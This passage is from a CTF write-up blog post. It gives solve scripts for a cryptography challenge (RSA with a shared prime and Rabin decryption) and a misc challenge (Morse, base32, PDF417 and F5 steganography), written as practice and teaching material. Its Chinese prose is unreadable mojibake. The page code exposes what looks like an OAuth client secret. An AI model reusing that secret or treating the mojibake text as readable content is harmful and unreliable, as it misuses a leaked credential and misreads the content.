f.write(<span class="string">"n1: "</span>+str(n1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n2: "</span>+str(n2)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"key_encode: "</span>+str(key_encode)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>

<p><code>encode</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(len(flag))</span><br><span class="line"></span><br><span class="line">dec=int(flag.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(bin(dec)[<span class="number">2</span>:])==<span class="number">335</span></span><br><span class="line">mask=int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec=(dec^dec&lt;&lt;<span class="number">200</span> )&amp;mask</span><br><span class="line">enc=dec^bytes_to_long(KEY)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"enc: "</span>+str(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œè¦æ‹¿åˆ°flagï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ‹¿åˆ°<code>KEY</code>ï¼Œè€Œ<code>KEY</code>æ˜¯ç»è¿‡RSAåŠ å¯†çš„ã€‚<br>ä½†æ˜¯è§‚å¯ŸRSAä»£ç å‘ç°<code>n1</code>å’Œ<code>n2</code>æœ‰å…¬çº¦æ•°<code>p</code>ï¼Œåˆ©ç”¨æ¬§å‡ é‡Œä½•ç®—æ³•å³å¯æ±‚å¾—ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:         <span class="comment">#è€ƒè™‘ç‰¹æ®Šæƒ…å†µ</span></span><br><span class="line">        print(<span class="string">"n is not equal 0!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> m%n!=<span class="number">0</span>:</span><br><span class="line">            new=m</span><br><span class="line">            m=n</span><br><span class="line">            n=new%n</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†<code>p</code>ã€<code>q</code>ã€<code>r</code>ï¼Œä½†æ˜¯è¦å¾—åˆ°<code>KEY</code>ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°<code>s</code>ï¼Œè¿™ä¸ªåœ°æ–¹å‚è€ƒäº†ç½‘ä¸Šçš„<a href="https://www.anquanke.com/post/id/164575#h2-4">ä¸€ç¯‡æ–‡ç« </a>ä¸­çš„ä¸€éƒ¨åˆ†æ¥æ±‚ï¼Œä½†æ˜¯æ±‚å¾—çš„<code>s</code>ä¸æ˜¯<code>1500</code>bitã€ä½†æ˜¯åŠ å¯†çš„å¯†æ–‡å´æ˜¯ä¸€æ ·çš„â€¦ç„¶åä¹Ÿå°±æ²¡æœ‰åšä¸‹å»äº†ï¼Œç­‰WPå§â€¦<br>åæ¥ä¸€ä½å¸ˆå‚…åˆ†äº«äº†è‡ªå·±çš„æ€»ç»“ï¼Œå­¦ä¹ ä¸‹å§ï¼š<br><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a><br>å¸ˆå‚…ç»™äº†ä»–çš„è„šæœ¬åšå‚è€ƒï¼Œä½†æ˜¯è¿˜æ²¡å®Œå…¨ææ˜ç™½ï¼Œç­‰WPå‡ºæ¥ç ”ç©¶å¥½äº†å†è¡¥å……ã€‚</p>
<h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>åˆ©ç”¨<code>Rabin</code>ç®—æ³•è§£å¯†RSAéƒ¨åˆ†ï¼Œç„¶ååˆ©ç”¨è¿ç®—çš„ç‰¹æ€§å°†<code>dec=(dec^dec&lt;&lt;200)&amp;mask</code>é€šè¿‡<code>dec=(dec^dec&gt;&gt;200)&amp;mask</code>è¿›è¡Œè¿˜åŸï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q = n1/p</span><br><span class="line">e1 = <span class="number">125794</span></span><br><span class="line">e2 = <span class="number">42373</span></span><br><span class="line">b = gmpy2.gcd(e1, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">bd = gmpy2.invert(e1/b, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">s = pow(c1, bd, n1)</span><br><span class="line"></span><br><span class="line">u = pow(s,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">v = pow(s,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">s = gmpy2.invert(p,q)</span><br><span class="line">t = gmpy2.invert(q,p)</span><br><span class="line">x = (t*q*u+s*p*v)%n1</span><br><span class="line">x2 = -x%n1</span><br><span class="line">y = (t*q*u-s*p*v)%n1</span><br><span class="line">y2 = -y%n1</span><br><span class="line">might_s = [x, x2, y, y2]</span><br><span class="line">might_d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> might_s:</span><br><span class="line">    might_d.append(int(gmpy2.invert(e2, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(i<span class="number">-1</span>))))</span><br><span class="line"></span><br><span class="line">might_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line">key = <span class="number">42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276</span></span><br><span class="line">dec = key^enc</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br><span class="line">mask = int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec = (dec ^ dec&gt;&gt;<span class="number">200</span>)&amp;mask</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br></pre></td></tr></table></figure>

<h2 id="Misc-code-in-morse"><a href="#Misc-code-in-morse" class="headerlink" title="Misc-code_in_morse"></a>Misc-code_in_morse</h2><p>è€ƒå¯ŸåŸºæœ¬çš„æµé‡åˆ†æã€morseç¼–ç ï¼Œbase32è§£ç è½¬å›¾ç‰‡ï¼ŒPDF417å›¾ç‰‡çš„è¯†åˆ«ä»¥åŠF5éšå†™ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-8"><a href="#é¢˜ç›®åˆ†æ-8" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ‹¿åˆ°æµé‡åŒ…ä¹‹åå¯¼å‡º<code>HTTP</code>æ•°æ®ï¼Œå‘ç°ä¸€å…±å››ä¸ªæ–‡ä»¶ï¼Œåœ¨<code>PNG</code>æ–‡ä»¶ä¸­æ‹¿åˆ°äº†morseç ï¼Œåˆ°ç½‘ç«™è§£ç å¾—åˆ°ä¸€ä¸²base32ç ï¼Œè¿™ä¸ªæ—¶å€™åˆ°ç½‘ç«™ä¸Šè§£base32è§£ä¸å‡ºæ¥ï¼Œå°±ç”¨pythonè§£äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€å †hexï¼Œå…¶ä¸­è¿˜æœ‰<code>PNG</code>å­—æ ·ï¼Œæ–­å®šæ˜¯å›¾ç‰‡çš„æ•°æ®ï¼Œå†™äº†ä¸ªè„šæœ¬å¯¼å…¥åˆ°<code>png</code>å›¾ç‰‡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">b32 = <span class="string">"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA===="</span></span><br><span class="line">hex = base64.b32decode(b32)</span><br><span class="line">print(hex)</span><br><span class="line">f1 = open(<span class="string">"1.png"</span>,<span class="string">'wb'</span>)</span><br><span class="line">f1.write(hex)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‹¿åˆ°äº†å¦‚ä¸‹ä¸€å¼ å›¾ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu23.png" alt=""><br>åæ¥å¾—çŸ¥æ˜¯<code>PDF417</code>ï¼Œç„¶ååˆ°ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æ‰«æçš„æ–¹æ³•ï¼Œ<a href="https://online-barcode-reader.inliteresearch.com/">è¿™é‡Œ</a>å’Œ<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx">è¿™é‡Œ</a>éƒ½å¯ä»¥è¯†åˆ«ï¼Œè¯†åˆ«å‡ºäº†ä¸‹é¢è¿™ä¸ªå›¾ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu24.jpg" alt=""><br>è¿™é‡Œå¡äº†å¥½ä¹…ï¼Œè¦ä¸æ˜¯å°±æ‹¿åˆ°äº†äºŒè¡€äº†â€¦<br>åæ¥çœ‹åˆ°å›¾ç‰‡çš„æ ‡é¢˜<code>F5</code>å¾—çŸ¥æ˜¯<code>F5</code>éšå†™ï¼Œç„¶åç”¨<a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>è·‘å‡ºäº†flagã€‚<br><img src="http://www.ggb0n.cool/images/ichunqiu1.png" alt=""></p>
<p>è¿™é‡Œå¶ç„¶é—´å‘ç°äº†ä¸€ä¸ªæ›´å¥½ç”¨çš„å·¥å…·ï¼Œè¾“å…¥morseç å°±ç›´æ¥å‡ºäº†PDF417çš„å›¾ï¼Œåˆ†äº«ä¸€ä¸‹ï¼š<a href="https://gchq.github.io/CyberChef/">CyberChef</a>ï¼Œåªèƒ½è¯´ï¼Œå¸ˆå‚…ä»¬tql!</p>
</div><ul class="post-copyright"><li><strong>Post Title: </strong><a href="http://ggb0n.cool/2020/02/21/ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp/">ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp</a></li><li><strong>Post Author: </strong><a href="http://ggb0n.cool">ggb0n</a></li><li><strong>Post Link: </strong><a href="http://ggb0n.cool/2020/02/21/ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp/">http://ggb0n.cool/2020/02/21/ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp/</a></li><li><strong>Copyright Notice: </strong><span>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></li></ul><div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â Related Post</span><br><span>Â Â 1.<a class="is-size-6" href="/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank">é«˜æ ¡æˆ˜&quot;ç–«&quot;éƒ¨åˆ†é¢˜è§£</a><br></span><span>Â Â 2.<a class="is-size-6" href="/2020/02/29/V&amp;N%E5%85%AC%E5%BC%80%E8%B5%9B/" target="_blank">V&amp;Nå…¬å¼€èµ›</a><br></span><span>Â Â 3.<a class="is-size-6" href="/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/" target="_blank">å®‰æ’-æŠ—ç–«æœˆèµ›</a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â Recommend Post</span><br><span>Â Â 1.<a class="is-size-6" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/" target="_blank">obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="http://ggb0n.cool/images/emFuc2hhbmc=.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">å®‰æ’-æŠ—ç–«æœˆèµ›</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/18/BSidesSF2019-WriteUp/"><span class="level-item">BSidesSF2019-WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
            var gitalk = new Gitalk({
            id: '7d1a9a19919444f070c494058441919e',
            repo: 'blog_comment',
            owner: 'ggb0n',
            clientID: '0a75c84e24da4e774d10',
            clientSecret: '80c72733da730b019e5047ae6c7eff937914a4d9',
            admin: ["ggb0n"],
            createIssueManually: true,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: 'last',
            
            
            enableHotKey: true,
            isLocked: false
        })
        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" href="#Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><span>Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜" href="#è§£é¢˜"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-ezupload" href="#Web-ezupload"><span>Web-ezupload</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-1" href="#è§£é¢˜-1"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-ç›²æ³¨" href="#Web-ç›²æ³¨"><span>Web-ç›²æ³¨</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-2" href="#è§£é¢˜-2"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-blacklist" href="#Web-blacklist"><span>Web-blacklist</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-3" href="#è§£é¢˜-3"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-easysqli-copy" href="#Web-easysqli-copy"><span>Web-easysqli_copy</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ" href="#é¢˜ç›®åˆ†æ"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-4" href="#è§£é¢˜-4"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-Easqli" href="#Web-Easqli"><span>Web-Easqli</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-1" href="#é¢˜ç›®åˆ†æ-1"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜è„šæœ¬" href="#è§£é¢˜è„šæœ¬"><span>è§£é¢˜è„šæœ¬</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-FlaskApp" href="#Web-FlaskApp"><span>Web-FlaskApp</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-2" href="#é¢˜ç›®åˆ†æ-2"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-5" href="#è§£é¢˜-5"><span>è§£é¢˜</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è·å–username" href="#è·å–username"><span>è·å–username</span></a></li><li><a class="is-flex toc-item" id="toc-item-è·å–str-uuid-getnode" href="#è·å–str-uuid-getnode"><span>è·å–str(uuid.getnode())</span></a></li><li><a class="is-flex toc-item" id="toc-item-è·å–æœºå™¨ç " href="#è·å–æœºå™¨ç "><span>è·å–æœºå™¨ç </span></a></li></ul></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Web-easy-thinking" href="#Web-easy-thinking"><span>Web-easy_thinking</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-3" href="#é¢˜ç›®åˆ†æ-3"><span>é¢˜ç›®åˆ†æ</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-babyPHP" href="#babyPHP"><span>babyPHP</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-4" href="#é¢˜ç›®åˆ†æ-4"><span>é¢˜ç›®åˆ†æ</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Ez-Express" href="#Ez-Express"><span>Ez_Express</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-5" href="#é¢˜ç›®åˆ†æ-5"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-6" href="#è§£é¢˜-6"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Node-Game" href="#Node-Game"><span>Node Game</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-6" href="#é¢˜ç›®åˆ†æ-6"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-7" href="#è§£é¢˜-7"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Crypto-Easy-RSA" href="#Crypto-Easy-RSA"><span>Crypto-Easy_RSA</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-8" href="#è§£é¢˜-8"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Crypto-warm-up" href="#Crypto-warm-up"><span>Crypto-warm_up</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-7" href="#é¢˜ç›®åˆ†æ-7"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è¡¥å……" href="#è¡¥å……"><span>è¡¥å……</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Misc-code-in-morse" href="#Misc-code-in-morse"><span>Misc-code_in_morse</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-8" href="#é¢˜ç›®åˆ†æ-8"><span>é¢˜ç›®åˆ†æ</span></a></li></ul></li></ul></div></div><script type="text/javascript" async>
        $(document).ready(function () { //å‚è€ƒè‡ª https://github.com/ppoffice/hexo-theme-icarus/pull/616/files
            var observerTopMargin;
            var scrollObserver;
            var headerElems = $(".headerlink");
            var activeTocItem;
        
            function initIntersectionObserver(docHeight) {
                observerTopMargin = docHeight;
                scrollObserver = new IntersectionObserver(scrollCallBack,
                    {
                        root: null,  // viewpoint
                        rootMargin: docHeight + "px 0px -80% 0px"  // cover top 30% of viewport to the top of document
                    })
            }
        
            function scrollCallBack(entries, observer) {
                if ($(window).scrollTop() > observerTopMargin * 0.7) { 
                    // User somehow scroll to 70% of observerTopMargin (which is inited as 200% document height)
                    // Observer top margin need to extend to cover all the space to the top of the document
